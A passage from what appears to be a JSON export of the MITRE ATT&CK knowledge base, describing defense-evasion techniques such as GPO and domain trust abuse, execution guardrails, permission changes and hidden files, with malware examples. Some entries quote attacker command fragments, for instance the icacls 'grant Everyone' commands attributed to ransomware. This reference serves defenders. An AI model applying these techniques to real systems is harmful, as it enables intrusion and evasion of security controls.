(GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path \\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\.\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\nMalicious GPO modifications can be used to implement many other malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress Tool Transfer, Create Account, Service Execution,  and more. Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.\nFor example, publicly available scripts such as New-GPOImmediateTask can be leveraged to automate the creation of a malicious Scheduled Task/Job by modifying GPO settings, in this case modifying <GPO_PATH>\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml. In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <GPO_PATH>\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.", "id": "T1484.001", "examples": [{"id": "C0034", "name": "2022 Ukraine Electric Power Attack", "description": "During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Group Policy Objects (GPOs) to deploy and execute malware."}, {"id": "G0096", "name": "APT41", "description": "APT41 used scheduled tasks created via Group Policy Objects (GPOs) to deploy ransomware."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used Group Policy to deploy batch scripts for ransomware deployment."}, {"id": "S0554", "name": "Egregor", "description": "Egregor can modify the GPO to evade detection. "}, {"id": "S0363", "name": "Empire", "description": "Empire can use New-GPOImmediateTask to modify a GPO that will install and execute a malicious Scheduled Task/Job."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper has the ability to deploy through an infected system's default domain policy."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used Group Policy Objects to deploy batch scripts."}, {"id": "S0688", "name": "Meteor", "description": "Meteor can use group policy to push a scheduled task from the AD to all network machines."}, {"id": "S1058", "name": "Prestige", "description": "Prestige has been deployed using the Default Domain Group Policy Object from an Active Directory Domain Controller."}]}, {"name": "Trust Modification", "description": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources. These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.", "detailed_description": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources. These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\nManipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge SAML Tokens without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.\nAn adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant. This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.", "id": "T1484.002", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can create a backdoor by converting a domain to a federated domain which will be able to authenticate any user across the tenant. AADInternals can also modify DesktopSSO information."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider adds a federated identity provider to the victim\u2019s SSO tenant and activates automatic account linking."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate."}]}]}, {"name": "Execution Guardrails", "description": "Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary\u2019s campaign. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.", "detailed_description": "Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary\u2019s campaign. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.\nGuardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.\nAdversaries may identify and block certain user-agents to evade defenses and narrow the scope of their attack to victims and platforms on which it will be most effective. A user-agent self-identifies data such as a user's software application, operating system, vendor, and version. Adversaries may check user-agents for operating system identification and then only serve malware for the exploitable software while ignoring all other operating systems.", "id": "T1480", "examples": [{"id": "S0504", "name": "Anchor", "description": "Anchor can terminate itself if specific execution flags are not present."}, {"id": "S1133", "name": "Apostle", "description": "Apostle's ransomware variant requires that a base64-encoded argument is passed when executed, that is used as the Public Key for subsequent encryption operations. If Apostle is executed without this argument, it automatically runs a self-delete function."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer compares file names and paths to a list of excluded names and directory names during encryption."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox can check its current working directory and for the presence of a specific file and terminate if specific values are not found."}, {"id": "S1161", "name": "BPFDoor", "description": "BPFDoor creates a zero byte PID file at /var/run/haldrund.pid. BPFDoor uses this file to determine if it is already running on a system to ensure only one instance is executing at a time."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can execute a task which leads to execution if it finds a process name containing \"creensaver.\""}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate uses per-victim links for hosting malicious archives, such as ZIP files, in services such as SharePoint to prevent other entities from retrieving them."}, {"id": "S1052", "name": "DEADEYE", "description": "DEADEYE can ensure it executes only on intended systems by identifying the victim's volume serial number, hostname, and/or DNS domain."}, {"id": "S0634", "name": "EnvyScout", "description": "EnvyScout can call window.location.pathname to ensure that embedded files are being executed from the C: drive, and will terminate if they are not."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used geoblocking to limit downloads of the malicious file to specific geographic locations."}, {"id": "S1143", "name": "LunarLoader", "description": "LunarLoader can use the DNS domain name of a compromised host to create a decryption key to ensure a malicious payload can only execute against the intended targets."}, {"id": "S0637", "name": "NativeZone", "description": "NativeZone can check for the presence of KM.EkeyAlmaz1C.dll and will halt execution unless it is in the same directory as the rest of the malware's components."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin will check for the presence of several security products on victim machines and will avoid UAC bypass mechanisms if they are identified. Raspberry Robin can use specific cookie values in HTTP requests to command and control infrastructure to validate that requests for second stage payloads originate from the initial downloader script."}, {"id": "S1150", "name": "ROADSWEEP", "description": "ROADSWEEP requires four command line arguments to execute correctly, otherwise it will produce a message box and halt execution."}, {"id": "S1035", "name": "Small Sieve", "description": "Small Sieve can only execute correctly if the word Platypus is passed to it on the command line."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet checks for specific operating systems on 32-bit machines, Registry keys, and dates for vulnerabilities, and will exit execution if the values are not met."}, {"id": "S0562", "name": "SUNSPOT", "description": "SUNSPOT only replaces SolarWinds Orion source code if the MD5 checksums of both the original source code file and backdoored replacement source code match hardcoded values."}, {"id": "S0678", "name": "Torisma", "description": "Torisma is only delivered to a compromised host if the victim's IP address is on an allow-list."}, {"id": "S0636", "name": "VaporRage", "description": "VaporRage has the ability to check for the presence of a specific DLL and terminate if it is not found."}], "sub_techniques": [{"name": "Environmental Keying", "description": "Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.", "detailed_description": "Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.\nValues can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses. By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult. These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\nSimilar to Obfuscated Files or Information, adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution. By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult. This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.\nLike other Execution Guardrails, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.", "id": "T1480.001", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 has encrypted payloads using the Data Protection API (DPAPI), which relies on keys tied to specific user accounts on specific machines. APT41 has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number."}, {"id": "G0020", "name": "Equation", "description": "Equation has been observed utilizing environmental keying in payload delivery."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can use Data Protection API to encrypt its components on the victim\u2019s computer, to evade detection, and to make sure the payload can only be decrypted and loaded on one specific compromised computer."}, {"id": "S1100", "name": "Ninja", "description": "Ninja can store its final payload in the Registry under $HKLM\\SOFTWARE\\Classes\\Interface\\ encrypted with a dynamically generated key based on the drive\u2019s serial number."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot stops execution if the infected system language matches one of several languages, with various versions referencing: Georgian, Kazakh, Uzbek, Tajik, Russian, Ukrainian, Belarussian, and Slovenian."}, {"id": "S0685", "name": "PowerPunch", "description": "PowerPunch can use the volume serial number from a target host to generate a unique XOR key for the next stage payload."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT relies on a specific victim hostname to execute and decrypt important strings."}, {"id": "S0141", "name": "Winnti for Windows", "description": "The Winnti for Windows dropper component can verify the existence of a single command line parameter and either terminate if it is not found or later use it as a decryption key."}]}, {"name": "Mutual Exclusion", "description": "Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time.", "detailed_description": "Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time.\nWhile local mutexes only exist within a given process, allowing multiple threads to synchronize access to a resource, system mutexes can be used to synchronize the activities of multiple processes. By creating a unique system mutex associated with a particular malware, adversaries can verify whether or not a system has already been compromised.\nIn Linux environments, malware may instead attempt to acquire a lock on a mutex file. If the malware is able to acquire the lock, it continues to execute; if it fails, it exits to avoid creating a second instance of itself.\nMutex names may be hard-coded or dynamically generated using a predictable algorithm.", "id": "T1480.002", "examples": [{"id": "S1070", "name": "Black Basta", "description": "Black Basta will check for the presence of a hard-coded mutex dsajdhas.0 before executing."}, {"id": "S0168", "name": "Gazer", "description": "Gazer creates a mutex using the hard-coded value {531511FA-190D-5D85-8A4A-279F2F592CC7} to ensure that only one instance of itself is running."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent uses the last 64 bytes of the binary to compute a mutex name. If the generated name is invalid, it will default to the generic mymutex."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy creates a mutex using either a custom or default value."}, {"id": "S0496", "name": "REvil", "description": "REvil attempts to create a mutex using a hard-coded value to ensure that no other instances of itself are running on the host."}, {"id": "S0562", "name": "SUNSPOT", "description": "SUNSPOT creates a mutex using the hard-coded value {12d61a41-4b74-7610-a4d8-3028d2f56395} to ensure that only one instance of itself is running."}]}]}, {"name": "Exploitation for Defense Evasion", "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.", "detailed_description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for Security Software Discovery. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries , evade security logs , or deploy hidden infrastructure.", "id": "T1211", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used CVE-2015-4902 to bypass security features."}], "sub_techniques": []}, {"name": "File and Directory Permissions Modification", "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).", "detailed_description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.", "id": "T1222", "examples": [], "sub_techniques": [{"name": "Windows File and Directory Permissions Modification", "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).", "detailed_description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.\nAdversaries can interact with the DACLs using built-in Windows commands, such as icacls, cacls, takeown, and attrib, which can grant adversaries higher permissions on specific files and folders. Further, PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.", "id": "T1222.001", "examples": [{"id": "S0570", "name": "BitPaymer", "description": "BitPaymer can use icacls /reset and takeown /F to reset a targeted executable's permissions and then take ownership."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat can use Windows commands such as fsutil behavior set SymLinkEvaluation R2L:1 to redirect file system access to a different location after gaining access into compromised networks."}, {"id": "S0693", "name": "CaddyWiper", "description": "CaddyWiper can modify ACL entries to take ownership of files."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can modify the binary ACL to prevent security tools from running."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can use the command-line utility cacls.exe to change file permissions."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk can launch icacls  /grant Everyone:F /T /C /Q to delete every access-based restrictions on files and directories."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry uses attrib +h and icacls . /grant Everyone:F /T /C /Q to make some of its files hidden and grant all users full access controls."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker has a command to take ownership of a file and reset the ACL permissions using the takeown.exe /F filepath command."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used the icacls command to modify access control to backup servers, providing them with full control of all the system folders."}]}, {"name": "Linux and Mac File and Directory Permissions Modification", "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).", "detailed_description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: chown (short for change owner), and chmod (short for change mode).\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Unix Shell Configuration Modification or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.", "id": "T1222.002", "examples": [{"id": "G0050", "name": "APT32", "description": "APT32's macOS backdoor changes the permission of the file it wants to execute to 755."}, {"id": "S1070", "name": "Black Basta", "description": "The Black Basta binary can use chmod to gain full permissions to targeted files."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore changes the permissions of a payload using the command chmod -R 755."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER will set the GID of httpsd to 90 when infected."}, {"id": "S0281", "name": "Dok", "description": "Dok gives all users execute permissions for the application using the command chmod +x /Users/Shared/AppStore.app."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has used chmod to modify permissions on key files for use."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity altered permissions on downloaded tools and payloads to enable execution on victim machines."}, {"id": "S0402", "name": "OSX/Shlayer", "description": "OSX/Shlayer can use the chmod utility to set a file as executable, such as chmod 777 or chmod +x."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D has changed permissions of a second-stage payload to an executable via chmod."}, {"id": "S0598", "name": "P.A.S. Webshell", "description": "P.A.S. Webshell has the ability to modify file permissions."}, {"id": "S0587", "name": "Penquin", "description": "Penquin can add the executable flag to a downloaded file."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has changed file permissions of files so they could not be modified."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has modified the permissions on binaries with chattr."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET uses the chmod +x command to grant executable permissions to the malicious file."}]}]}, {"name": "Hide Artifacts", "description": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.", "detailed_description": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.", "id": "T1564", "examples": [{"id": "S0482", "name": "Bundlore", "description": "Bundlore uses the mktemp utility to make unique file and directory names for payloads, such as TMP_DIR=`mktemp -d -t x."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla has used %HiddenReg% and %HiddenKey% as part of its persistence via the Windows registry."}, {"id": "S0402", "name": "OSX/Shlayer", "description": "OSX/Shlayer has used the mktemp utility to make random and unique filenames for payloads, such as export tmpDir=\"$(mktemp -d /tmp/XXXXXXXXXXXX)\" or mktemp -t Installer."}, {"id": "S1011", "name": "Tarrask", "description": "Tarrask is able to create \"hidden\" scheduled tasks by deleting the Security Descriptor (SD) registry value."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can masquerade the Process Environment Block on a compromised host to hide its attempts to elevate privileges through IFileOperation."}], "sub_techniques": [{"name": "Hidden Files and Directories", "description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls \u2013a for Linux and macOS).", "detailed_description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls \u2013a for Linux and macOS).\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \".\" as the first character in the file or folder name   . Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \"ls\". Users must specifically change settings to have these files viewable.\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.", "id": "T1564.001", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has created hidden folders."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has added a leading . to plist filenames, unlisting them from the Finder app and default Terminal directory listings."}, {"id": "G0007", "name": "APT28", "description": "APT28 has saved files with hidden file attributes."}, {"id": "G0050", "name": "APT32", "description": "APT32's macOS backdoor hides the clientID file via a chflags function."}, {"id": "S0438", "name": "Attor", "description": "Attor can set attributes of log files and directories to HIDDEN, SYSTEM, ARCHIVE, or a combination of those."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig has the ability to set folders or files to be hidden from the Windows Explorer default view."}, {"id": "S0274", "name": "Calisto", "description": "Calisto uses a hidden directory named .calisto to store data from the victim\u2019s machine before exfiltration."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has created a hidden file in the Startup folder of the current user."}, {"id": "S1043", "name": "ccf32", "description": "ccf32 has created a hidden directory on targeted systems, naming it after the current local time (year, month, and day)."}, {"id": "S0660", "name": "Clambling", "description": "Clambling has the ability to set its file attributes to hidden."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER creates and installs itself to a hidden installation directory."}, {"id": "S0369", "name": "CoinTicker", "description": "CoinTicker downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.[random string]/[random string]."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer has copied its binary and the victim's scraped password into a hidden folder in the /Users directory."}, {"id": "S0497", "name": "Dacls", "description": "Dacls has had its payload named with a dot prefix to make it hidden from view in the Finder application."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate initial installation involves dropping several files to a hidden directory named after the victim machine name."}, {"id": "S0634", "name": "EnvyScout", "description": "EnvyScout can use hidden directories and files to hide malicious executables."}, {"id": "S0569", "name": "Explosive", "description": "Explosive has commonly set file and path attributes to hidden."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has created hidden files and folders within a compromised Linux system /tmp directory. FIN13 also has used attrib.exe to hide gathered local host information."}, {"id": "S0277", "name": "FruitFly", "description": "FruitFly saves itself with a leading \".\" to make it a hidden file."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has hidden files on a compromised host."}, {"id": "S0278", "name": "iKitten", "description": "iKitten saves itself with a leading \".\" so that it's hidden from users by default."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has a dynamic debugging feature to set the file attribute to hidden."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can create hidden system directories."}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe sets its own executable file's attributes to hidden."}, {"id": "S0162", "name": "Komplex", "description": "The Komplex payload is stored in a hidden directory at /Users/Shared/.local/kextd."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used a VBA Macro to set its file attributes to System and Hidden and has named files with a dot prefix to hide them from the Finder application."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has the ability to copy itself to a hidden file and directory."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner has set the attributes of the VirtualBox directory and VBoxVmService parent directory to \"hidden\"."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used malware to store malicious binaries in hidden directories on victim's USB drives."}, {"id": "S0409", "name": "Machete", "description": "Machete has the capability to exfiltrate stolen data to a hidden folder on a removable drive."}, {"id": "S0282", "name": "MacSpy", "description": "MacSpy stores itself in ~/Library/.DS_Stores/ "}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia creates a new hidden directory to store all components' outputs in a dedicated sub-folder for each."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda's PlugX variant has created a hidden folder on USB drives named RECYCLE.BIN to store malicious executables and collected data."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can copy itself to and launch itself from hidden folders."}, {"id": "S0439", "name": "Okrum", "description": "Before exfiltration, Okrum's backdoor has used hidden files to store logs and outputs from backdoor commands."}, {"id": "S0402", "name": "OSX/Shlayer", "description": "OSX/Shlayer has executed a .command script from a hidden directory in a mounted DMG."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D sets the main loader file\u2019s attributes to hidden."}, {"id": "S0013", "name": "PlugX", "description": "PlugX can modify the characteristics of folders to hide them from the compromised user."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has the ability to hide and unhide files."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has placed its payload in hidden subdirectories."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT has the ability to set file attributes to \"hidden\" to hide files from the compromised user's view in Windows File Explorer."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl added the \"hidden\" file attribute to original files, manipulating victims to click on malicious LNK files."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun can modify file attributes to hide files."}, {"id": "G0106", "name": "Rocke", "description": "Rocke downloaded a file \"libprocesshider\", which could hide files on the target system."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has been created with a hidden attribute to insure it's not visible to the victim."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate has the ability to set file attributes to hidden."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest hides a copy of itself in the user's ~/Library directory by using a . at the beginning of the file name followed by 9 random characters."}, {"id": "G0134", "name": "Transparent Tribe", "description": "Transparent Tribe can hide legitimate directories and replace them with malicious copies of the same name."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has created a hidden directory under C:\\ProgramData\\Apple\\Updates\\ and C:\\Users\\Public\\Documents\\Flash\\."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry uses attrib +h to make some of its files hidden."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker has copied a random file from the Windows System32 folder to the %APPDATA% location under a different hidden filename."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET uses a hidden folder named .xcassets and .git to embed itself in Xcode."}]}, {"name": "Hidden Users", "description": "Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.", "detailed_description": "Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.\nIn macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value Hide500Users to TRUE in the /Library/Preferences/com.apple.loginwindow 